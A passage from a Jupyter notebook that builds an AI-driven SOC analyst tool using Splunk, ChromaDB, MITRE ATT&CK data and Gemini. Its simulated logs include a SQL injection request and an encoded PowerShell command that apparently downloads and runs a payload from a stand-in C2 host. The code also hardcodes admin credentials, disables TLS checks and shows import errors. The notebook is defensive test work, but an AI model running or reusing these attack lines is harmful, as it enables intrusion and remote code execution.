    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\")\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\",)\n",
    "# --- Splunk Connection Function ---\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    print(f\"Attempting to connect to Splunk at {SPLUNK_HOST}:{8089}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=\"127.0.0.1\",\n",
    "            port=\"8089\",\n",
    "            username=\"admin\",\n",
    "            password=\"admin123\",\n",
    "            scheme=\"https\", # Use http for the management port 8089 if not configured for https\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "# --- Splunk Query Execution Function ---\n",
    "# --- Splunk Query Execution Function ---\n",
    "# --- Splunk Query Execution Function ---\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        # Add 'app' parameter to ensure the search runs in the 'search' app context\n",
    "        kwargs = {\n",
    "            \"earliest_time\": earliest_time,\n",
    "            \"latest_time\": latest_time,\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\"  # <--- ADD THIS LINE\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        # Wait for the job to complete\n",
    "        while not job.is_ready():\n",
    "            pass # Or add a short sleep: time.sleep(0.1)\n",
    "\n",
    "        if job.is_done():\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk.\")\n",
    "            return events\n",
    "        else:\n",
    "            # If job failed and messages are empty, try to get diagnostic info\n",
    "            print(f\"Splunk search job failed. Messages: {job.messages}\")\n",
    "            # Consider adding job.status() or job.content for more details here if it keeps failing\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "\n",
    "# ... (rest of the script remains the same) ...\n",
    "# ... (rest of the script remains the same) ...\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting Splunk Dummy Data Test ---\")\n",
    "\n",
    "    # 1. Connect to Splunk\n",
    "    splunk_service = connect_to_splunk()\n",
    "    if not splunk_service:\n",
    "        print(\"Failed to establish connection to Splunk. Exiting.\")\n",
    "        exit(1) # Exit if connection fails\n",
    "\n",
    "    # 2. Define a very simple dummy data query\n",
    "    # This query uses 'makeresults' to generate 3 dummy events.\n",
    "    # It starts immediately with '|' after the triple quotes to avoid syntax errors.\n",
    "    dummy_query = \"\"\"| makeresults count=3\n",
    "| eval _time=strftime(now(), \"%Y-%m-%d %H:%M:%S\")\n",
    "| streamstats count as event_id\n",
    "| eval message=case(event_id=1, \"This is dummy event 1\",\n",
    "                     event_id=2, \"This is dummy event 2\",\n",
    "                     event_id=3, \"This is dummy event 3\")\n",
    "| eval host=case(event_id=1, \"test-host-01\",\n",
    "                  event_id=2, \"test-host-01\",\n",
    "                  event_id=3, \"test-host-02\")\n",
    "| table _time, host, event_id, message\"\"\"\n",
    "\n",
    "    # 3. Run the dummy query\n",
    "    dummy_events = run_splunk_query(splunk_service, dummy_query)\n",
    "\n",
    "    # 4. Print retrieved dummy data\n",
    "    if dummy_events:\n",
    "        print(\"\\n--- Retrieved Dummy Data ---\")\n",
    "        for event in dummy_events:\n",
    "            print(event) # Each 'event' is a dictionary-like object\n",
    "\n",
    "    # 5. Log out from Splunk (good practice)\n",
    "    try:\n",
    "        splunk_service.logout()\n",
    "        print(\"\\nLogged out from Splunk.\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error during Splunk logout: {e}\")\n",
    "\n",
    "    print(\"--- Splunk Dummy Data Test Completed ---\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "d91b1c86",
   "metadata": {},
   "outputs": [
    {
     "ename": "ImportError",
     "evalue": "cannot import name 'ATTACK_V12' from 'stixmarx' (C:\\Users\\mohamed elmadany\\AppData\\Roaming\\Python\\Python311\\site-packages\\stixmarx\\__init__.py)",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mImportError\u001b[39m                               Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[10]\u001b[39m\u001b[32m, line 18\u001b[39m\n\u001b[32m     16\u001b[39m \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34;01mstix\u001b[39;00m\u001b[34;01m.\u001b[39;00m\u001b[34;01mcore\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mimport\u001b[39;00m STIXPackage\n\u001b[32m     17\u001b[39m \u001b[38;5;66;03m#from stix.utils.idgen import set_id_namespace\u001b[39;00m\n\u001b[32m---> \u001b[39m\u001b[32m18\u001b[39m \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34;01mstixmarx\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mimport\u001b[39;00m ATTACK_V12\n\u001b[32m     20\u001b[39m \u001b[38;5;66;03m# For LLM and Embeddings (using Google Gemini)\u001b[39;00m\n\u001b[32m     21\u001b[39m \u001b[38;5;28;01mimport\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34;01mgoogle\u001b[39;00m\u001b[34;01m.\u001b[39;00m\u001b[34;01mgenerativeai\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mas\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34;01mgenai\u001b[39;00m\n",
      "\u001b[31mImportError\u001b[39m: cannot import name 'ATTACK_V12' from 'stixmarx' (C:\\Users\\mohamed elmadany\\AppData\\Roaming\\Python\\Python311\\site-packages\\stixmarx\\__init__.py)"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import json\n",
    "import datetime\n",
    "import math\n",
    "import random\n",
    "import time\n",
    "import re\n",
    "import uuid\n",
    "\n",
    "# Core Libraries\n",
    "import chromadb\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# For MITRE ATT&CK data parsing\n",
    "from stix.core import STIXPackage\n",
    "#from stix.utils.idgen import set_id_namespace\n",
    "from stixmarx import ATTACK_V12\n",
    "\n",
    "# For LLM and Embeddings (using Google Gemini)\n",
    "import google.generativeai as genai\n",
    "\n",
    "# --- Configuration ---\n",
    "# Splunk Settings (ensure these match your working Splunk setup)\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\") # IMPORTANT: Replace with your actual password\n",
    "\n",
    "# Google Gemini API Key\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Get your key from Google AI Studio.\")\n",
    "\n",
    "# ChromaDB Settings\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "COLLECTION_NAME = \"security_knowledge_base\"\n",
    "\n",
    "# MITRE ATT&CK Data File\n",
    "MITRE_STIX_JSON_PATH = \"enterprise-attack.json\" # Ensure this file is in the same directory\n",
    "\n",
    "# Initialize Google Gemini\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "# For text generation (using gemini-pro)\n",
    "llm = genai.GenerativeModel('gemini-pro')\n",
    "# For embeddings (using embedding-001)\n",
    "embedding_model = 'embedding-001'\n",
    "\n",
    "# ChromaDB Client & Collection Setup\n",
    "client_db = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "security_collection = client_db.get_or_create_collection(name=COLLECTION_NAME)\n",
    "\n",
    "# --- Helper Functions for ChromaDB and MITRE ATT&CK ---\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path):\n",
    "    \"\"\"Loads MITRE ATT&CK techniques from a STIX JSON file.\"\"\"\n",
    "    print(f\"Loading MITRE ATT&CK data from {stix_json_path}...\")\n",
    "    try:\n",
    "        with open(stix_json_path, 'r', encoding='utf-8') as f:\n",
    "            stix_package_dict = json.load(f)\n",
    "\n",
    "        #set_id_namespace(ATTACK_V12) # Set the namespace for correct ID parsing\n",
    "        stix_package = STIXPackage.from_dict(stix_package_dict)\n",
    "        stix_store = stix_package.to_id_mapping()\n",
    "\n",
    "        attack_data_points = []\n",
    "        for tech in stix_store.get_all(filter=lambda obj: obj.type == 'attack-pattern'):\n",
    "            mitre_id = tech.external_references[0].external_id if tech.external_references else 'N/A'\n",
    "            \n",
    "            # Construct description with mitigations and examples if available\n",
    "            description = tech.description.value if tech.description else ''\n",
    "            \n",
    "            # Extract mitigations\n",
    "            mitigation_text = []\n",
    "            for relationship in stix_store.query(\n",
    "                client.Filter(\"target_ref\", \"=\", tech.id),\n",
    "                client.Filter(\"relationship_type\", \"=\", \"mitigates\")\n",
    "            ):\n",
    "                mitigation_obj = stix_store.query(client.Filter(\"id\", \"=\", relationship.source_ref))\n",
    "                if mitigation_obj and mitigation_obj[0].type == 'course-of-action':\n",
    "                    mitigation_text.append(f\"Mitigation: {mitigation_obj[0].description.value}\")\n",
    "\n",
    "            # Extract examples\n",
    "            example_text = []\n",
    "            for relationship in stix_store.query(\n",
    "                client.Filter(\"source_ref\", \"=\", tech.id),\n",
    "                client.Filter(\"relationship_type\", \"=\", \"uses\")\n",
    "            ):\n",
    "                if hasattr(relationship, 'description') and relationship.description:\n",
    "                    example_text.append(f\"Example: {relationship.description.value}\")\n",
    "\n",
    "            full_text = f\"ATT&CK Technique ID: {mitre_id}\\nName: {tech.name}\\nDescription: {description}\"\n",
    "            if mitigation_text:\n",
    "                full_text += \"\\n\" + \"\\n\".join(mitigation_text)\n",
    "            if example_text:\n",
    "                full_text += \"\\n\" + \"\\n\".join(example_text)\n",
    "\n",
    "            # Extract tactics\n",
    "            tactics_names = []\n",
    "            for relationship in stix_store.query(client.Filter(\"source_ref\", \"=\", tech.id), client.Filter(\"relationship_type\", \"=\", \"uses\")):\n",
    "                tactic_obj = stix_store.query(client.Filter(\"id\", \"=\", relationship.target_ref))\n",
    "                if tactic_obj and tactic_obj[0].type == 'tactic':\n",
    "                    tactics_names.append(tactic_obj[0].name)\n",
    "            \n",
    "            # Fix for ValueError: Ensure tactics for metadata is always a string\n",
    "            tactics_for_metadata = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "\n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_for_metadata, # Use the guaranteed string variable\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        return attack_data_points\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge data points.\"\"\"\n",
    "    print(f\"Populating security knowledge base with {len(data_points)} documents...\")\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        try:\n",
    "            # Generate embeddings for the document text\n",
    "            response = genai.embed_content(model=embedding_model, content=dp[\"text\"])\n",
    "            embedding = response['embedding']\n",
    "            \n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp[\"metadata\"])\n",
    "            ids_to_add.append(dp[\"id\"])\n",
    "        except Exception as e:\n",
    "            print(f\"Failed to generate embedding for: {dp['text'][:50]}... Error: {e}\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        security_collection.add(\n",
    "            documents=docs_to_add,\n",
    "            embeddings=embeddings_to_add,\n",
    "            metadatas=metadatas_to_add,\n",
    "            ids=ids_to_add\n",
    "        )\n",
    "        print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "    else:\n",
    "        print(\"No documents to add to the vector store.\")\n",
    "\n",
    "\n",
    "def get_related_security_knowledge(query_text, num_results=3):\n",
    "    \"\"\"Retrieves relevant security knowledge from the vector store.\"\"\"\n",
    "    try:\n",
    "        query_embedding_response = genai.embed_content(model=embedding_model, content=query_text)\n",
    "        query_embedding = query_embedding_response['embedding']\n",
    "        \n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=num_results,\n",
    "            include=['documents', 'metadatas', 'distances']\n",
    "        )\n",
    "        \n",
    "        related_knowledge = []\n",
    "        if results and results['documents']:\n",
    "            for i in range(len(results['documents'][0])):\n",
    "                doc = results['documents'][0][i]\n",
    "                meta = results['metadatas'][0][i]\n",
    "                distance = results['distances'][0][i]\n",
    "                related_knowledge.append({\n",
    "                    \"document\": doc,\n",
    "                    \"metadata\": meta,\n",
    "                    \"distance\": distance\n",
    "                })\n",
    "        return related_knowledge\n",
    "    except Exception as e:\n",
    "        print(f\"Error retrieving security knowledge: {e}\")\n",
    "        return []\n",
    "\n",
    "\n",
    "# --- Splunk Connection & Query Functions ---\n",
    "\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    connection_url = f\"https://{SPLUNK_HOST}:{SPLUNK_PORT}\"\n",
    "    print(f\"Attempting to connect to Splunk at {connection_url}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"https\",\n",
    "            verify=False # IMPORTANT: Use verify=True with proper CA in production\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        kwargs = {\n",
    "            \"earliest_time\": earliest_time,\n",
    "            \"latest_time\": latest_time,\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\" # Run search in the 'search' app context\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        # Wait for the job to complete\n",
    "        while not job.is_ready():\n",
    "            time.sleep(0.1) # Small sleep to avoid busy-waiting\n",
    "\n",
    "        if job.is_done():\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk.\")\n",
    "            return events\n",
    "        else:\n",
    "            print(f\"Splunk search job failed. Messages: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "\n",
    "# --- AI SOC Analyst Assistant Core Function ---\n",
    "\n",
    "def generate_security_report(raw_logs, security_knowledge_base_results):\n",
    "    \"\"\"\n",
    "    Generates a security report based on raw logs and related security knowledge,\n",
    "    including MITRE ATT&CK mapping.\n",
    "    \"\"\"\n",
    "    print(\"\\n--- Generating Security Report with AI ---\")\n",
    "    \n",
    "    # Prepare logs for AI\n",
    "    log_summary = \"\\n\".join([f\"Host: {log.get('host', 'N/A')}, Message: {log.get('message', str(log))}\" for log in raw_logs])\n",
    "    \n",
    "    # Prepare security knowledge\n",
    "    knowledge_summary = \"\\n\\n\".join([\n",
    "        f\"Technique ID: {res['metadata']['technique_id']}\\n\"\n",
    "        f\"Name: {res['metadata']['technique_name']}\\n\"\n",
    "        f\"Tactics: {res['metadata']['tactics']}\\n\"\n",
    "        f\"Description: {res['document']}\\n\"\n",
    "        f\"Similarity Score: {res['distance']:.4f}\"\n",
    "        for res in security_knowledge_base_results\n",
    "    ])\n",
    "\n",
    "    prompt = f\"\"\"\n",
    "You are an expert SOC analyst powered by AI. Your task is to analyze security logs, identify potential threats, map them to MITRE ATT&CK techniques, and provide actionable insights.\n",
    "\n",
    "**Security Logs:**\n",
    "{log_summary}\n",
    "\n",
    "**Related MITRE ATT&CK Knowledge:**\n",
    "(This knowledge is retrieved from a security knowledge base based on similarity to the logs. Use this information to map, explain findings, and suggest mitigations. Prioritize techniques with lower similarity scores as they are more relevant.)\n",
    "{knowledge_summary}\n",
    "**Your Report Should Include the Following Sections:**\n",
    "\n",
    "1.  **Summary of Findings:** Briefly describe the key events and potential incidents observed in the logs.\n",
    "2.  **Identified MITRE ATT&CK Techniques:** For each potential threat or suspicious activity, list the relevant MITRE ATT&CK Technique ID(s) and Name(s) from the 'Related MITRE ATT&CK Knowledge'. Explain *why* you believe these specific techniques apply to the observed logs.\n",
    "3.  **Severity Assessment:** Assign an overall severity rating (e.g., Low, Medium, High, Critical) to the findings and provide a clear justification.\n",
    "4.  **Recommended Actions:** Provide clear, actionable steps for a human analyst or automated system to take to address the identified threats. Incorporate relevant mitigations from the MITRE knowledge.\n",
    "5.  **Further Investigation:** Suggest additional areas or data sources that should be examined to gain a more complete understanding of the incident.\n",
    "\n",
    "**Please format your response clearly with headings for each section.**\n",
    "\"\"\"\n",
    "    \n",
    "    try:\n",
    "        # Generate content using the LLM\n",
    "        response = llm.generate_content(prompt)\n",
    "        report_text = response.text\n",
    "        print(\"\\n--- AI-Generated Security Report ---\")\n",
    "        print(report_text)\n",
    "        return report_text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating AI report: {e}\")\n",
    "        return \"Failed to generate report.\"\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting AI SOC Analyst Assistant (Full Architecture) ---\")\n",
    "\n",
    "    # 0. Check/Populate Security Knowledge Base (ChromaDB)\n",
    "    # This step ensures the vector database has the MITRE ATT&CK data.\n",
    "    # It checks the collection count to avoid re-populating if already done.\n",
    "    print(\"\\n--- Checking/Populating Security Knowledge Base with MITRE ATT&CK ---\")\n",
    "    # A heuristic: if collection has significantly fewer than total MITRE techniques (approx 800+), populate it.\n",
    "    if security_collection.count() < 800:\n",
    "        print(\"ChromaDB collection is currently empty or incomplete. MITRE ATT&CK data needs to be populated.\")\n",
    "        mitre_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n",
    "        if mitre_data_points:\n",
    "            populate_security_knowledge_base(mitre_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. AI mapping might be less effective.\")\n",
    "    else:\n",
    "        print(f\"MITRE ATT&CK data already present in knowledge base ({security_collection.count()} techniques found). Skipping initial population.\")\n",
    "    \n",
    "    print(f\"Total unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "\n",
    "    print(\"\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "\n",
    "    # 1. Connect to Splunk\n",
    "    splunk_service = connect_to_splunk()\n",
    "    if not splunk_service:\n",
    "        print(\"Failed to connect to Splunk. Cannot proceed.\")\n",
    "        exit(1) # Exit the script if Splunk connection fails\n",
    "\n",
    "    # 2. Define a more complex simulated Splunk query for security logs\n",
    "    # This query uses 'makeresults' to generate mock security events that hint at malicious activity.\n",
    "    splunk_simulated_logs_query = \"\"\"\n",
    "| makeresults count=6\n",
    "| streamstats count as rn\n",
    "| eval _time = case(\n",
    "    rn=1, relative_time(now(), \"-30s\"),\n",
    "    rn=2, relative_time(now(), \"-25s\"),\n",
    "    rn=3, relative_time(now(), \"-20s\"),\n",
    "    rn=4, relative_time(now(), \"-15s\"),\n",
    "    rn=5, relative_time(now(), \"-10s\"),\n",
    "    rn=6, relative_time(now(), \"-5s\")\n",
    "  )\n",
    "| eval host = case(\n",
    "    rn <= 5, \"webserver-01\",\n",
    "    rn=6, \"endpoint-05\"\n",
    "  )\n",
    "| eval source = case(\n",
    "    rn <= 4, \"/var/log/auth.log\",\n",
    "    rn=5, \"/var/log/apache2/access.log\",\n",
    "    rn=6, \"/var/log/syslog\"\n",
    "  )\n",
    "| eval message = case(\n",
    "    rn=1, \"Failed password for root from 192.168.1.100 port 54321 ssh2\",\n",
    "    rn=2, \"User 'jdoe' logged in successfully from 10.0.0.5 via SSH\",\n",
    "    rn=3, \"sudo: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash\",\n",
    "    rn=4, \"Failed password for invalid user guest from 192.168.1.101 port 12345 ssh2\",\n",
    "    rn=5, \"GET /admin/setup.php HTTP/1.1 200 - Mozilla/5.0\",\n",
    "    rn=6, \"User 'admin' created a new scheduled task 'BackdoorScript' to run daily\"\n",
    "  )\n",
    "| table _time, host, source, message\n",
    "| sort _time\n",
    "\"\"\"\n",
    "\n",
    "    # 3. Run the simulated Splunk query to get security events\n",
    "    security_events = run_splunk_query(splunk_service, splunk_simulated_logs_query)\n",
    "\n",
    "    if not security_events:\n",
    "        print(\"No security events retrieved from Splunk. Cannot proceed with analysis.\")\n",
    "        splunk_service.logout() # Ensure logout even if no events\n",
    "        exit(1)\n",
    "\n",
    "    print(\"\\n--- Retrieved Security Events from Splunk ---\")\n",
    "    for event in security_events:\n",
    "        # Print relevant fields from each event\n",
    "        print(f\"Time: {event.get('_time')}, Host: {event.get('host')}, Source: {event.get('source')}, Message: {event.get('message')}\")\n",
    "\n",
    "    # 4. Analyze logs and get related security knowledge from ChromaDB\n",
    "    # Combine all messages into a single string for the embedding query\n",
    "    combined_messages = \" \".join([event.get('message', '') for event in security_events])\n",
    "    \n",
    "    print(\"\\n--- Searching Security Knowledge Base for Related Techniques ---\")\n",
    "    # Retrieve the top 5 most relevant MITRE ATT&CK techniques\n",
    "    related_knowledge = get_related_security_knowledge(combined_messages, num_results=5)\n",
    "\n",
    "    if related_knowledge:\n",
    "        print(f\"Found {len(related_knowledge)} related security knowledge documents.\")\n",
    "        # Optional: Print a summary of found knowledge for quick review\n",
    "        for item in related_knowledge:\n",
    "            print(f\"- Technique: {item['metadata']['technique_name']} ({item['metadata']['technique_id']}), Score: {item['distance']:.4f}\")\n",
    "    else:\n",
    "        print(\"No related security knowledge found. AI mapping might be limited.\")\n",
    "\n",
    "    # 5. Generate AI Security Report using the retrieved logs and knowledge\n",
    "    generate_security_report(security_events, related_knowledge)\n",
    "\n",
    "    # 6. Log out from Splunk (good practice to close the session)\n",
    "    try:\n",
    "        splunk_service.logout()\n",
    "        print(\"\\nLogged out from Splunk.\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error during Splunk logout: {e}\")\n",
    "\n",
    "    print(\"\\n--- AI SOC Analyst Assistant (Full Architecture) Completed ---\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "4c93a8c0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Starting AI SOC Analyst Assistant (Full Architecture) ---\n",
      "\n",
      "--- Checking/Populating Security Knowledge Base ---\n",
      "MITRE ATT&CK data already present in knowledge base (823 techniques found).\n",
      "Sample security knowledge appears to be present. Skipping population.\n",
      "\n",
      "Total unique documents in knowledge base: 826\n",
      "\n",
      "\n",
      "=== Running Combined Simulated Scenario (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query ---\n",
      "DEBUG: Splunk query string:\n",
      "```\n",
      "| makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time\n",
      "```\n",
      "Attempting to connect to Splunk at https://127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "Retrieving data from Splunk...\n",
      "Attempting to run Splunk query:\n",
      "```\n",
      "| makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time\n",
      "```\n",
      "Splunk Job ID: 1748151489.77\n",
      "Job 1748151489.77 status: PARSING\n",
      "Job 1748151489.77 status: PARSING\n",
      "Job 1748151489.77 status: PARSING\n",
      "Splunk search job 1748151489.77 is DONE. Final dispatch state: DONE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\mohamed elmadany\\AppData\\Local\\Temp\\ipykernel_37924\\584230792.py:94: DeprecatedWarning: ResultsReader is deprecated. Use the JSONResultsReader function instead in conjuction with the 'output_mode' query param set to 'json'\n",
      "  reader = results.ResultsReader(job.results())\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Successfully retrieved 6 events from Splunk for Job ID 1748151489.77.\n",
      "Searching vector store for relevant general security knowledge...\n",
